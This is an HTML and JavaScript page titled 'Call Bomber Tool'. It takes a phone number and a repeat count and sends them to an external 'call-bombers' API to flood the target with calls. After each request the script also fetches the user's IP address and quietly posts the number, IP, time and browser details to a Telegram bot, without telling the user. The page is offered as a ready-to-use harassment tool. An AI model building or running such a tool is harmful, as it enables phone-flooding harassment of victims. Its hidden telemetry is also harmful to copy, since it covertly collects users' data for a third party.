<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Call Bomber Tool</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: #f8f9fa; }
    .card { max-width: 500px; margin: auto; margin-top: 50px; }
  </style>
</head>
<body>

<div class="card shadow">
  <div class="card-body">
    <h4 class="card-title text-center">📞 Call API Sender</h4>
    <div class="mb-3">
      <label class="form-label">Phone Number (11 digit)</label>
      <input type="text" id="number" class="form-control" maxlength="11" placeholder="e.g. 01312345678">
    </div>
    <div class="mb-3">
      <label class="form-label">Repeat</label>
      <input type="number" id="repeat" class="form-control" placeholder="e.g. 5">
    </div>
    <button class="btn btn-primary w-100" onclick="sendCall()">🚀 Send Call</button>
    <p class="mt-3 text-center" id="message"></p>
  </div>
</div>

<script>
  async function sendCall() {
    const number = document.getElementById("number").value.trim();
    const repeat = document.getElementById("repeat").value.trim();
    const messageBox = document.getElementById("message");

    if (!/^\d{11}$/.test(number)) {
      messageBox.innerText = "❌ Invalid phone number.";
      return;
    }

    if (!repeat || isNaN(repeat) || repeat < 1) {
      messageBox.innerText = "❌ Invalid repeat count.";
      return;
    }

    messageBox.innerText = "⏳ Sending request...";

    try {
      // Send request to API
      const res = await fetch(`https://call-bombers.vercel.app/send-call?key=DH%20Alamin%20Hasan&number=${number}&repeat=${repeat}`);
      const data = await res.text();

      messageBox.innerText = "✅ Call sent successfully!";

      // Get IP and user info
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();

      const now = new Date();
      const date = now.toLocaleDateString();
      const time = now.toLocaleTimeString();
      const userAgent = navigator.userAgent;

      const telegramMessage = `
📞 *New Call Request*
------------------------
📱 Number: ${number}
🔁 Repeat: ${repeat}
🌐 IP: ${ipData.ip}
🕒 Time: ${date} ${time}
🖥️ Info: ${userAgent}
      `;

      // Replace with your Telegram Bot Token & Chat ID
      const BOT_TOKEN = "YOUR_BOT_TOKEN";
      const CHAT_ID = "YOUR_CHAT_ID";

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: telegramMessage,
          parse_mode: "Markdown"
        })
      });

    } catch (error) {
      console.error(error);
      messageBox.innerText = "❌ Error sending call.";
    }
  }
</script>

</body>
</html>
